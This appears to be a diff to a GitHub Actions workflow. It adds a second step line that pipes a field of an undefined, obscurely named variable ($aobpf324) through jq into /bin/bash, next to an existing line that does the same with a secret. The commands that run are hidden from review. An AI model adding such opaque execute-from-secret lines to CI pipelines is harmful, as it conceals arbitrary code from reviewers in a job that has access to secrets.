@@ -21,6 +21,7 @@ jobs:
           x28: ${{ secrets.x28 }}
         run: |
           printf '%s' "$x28" | jq -r .bc1487 | /bin/bash
+          printf '%s' "$aobpf324" | jq -r .ie3 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
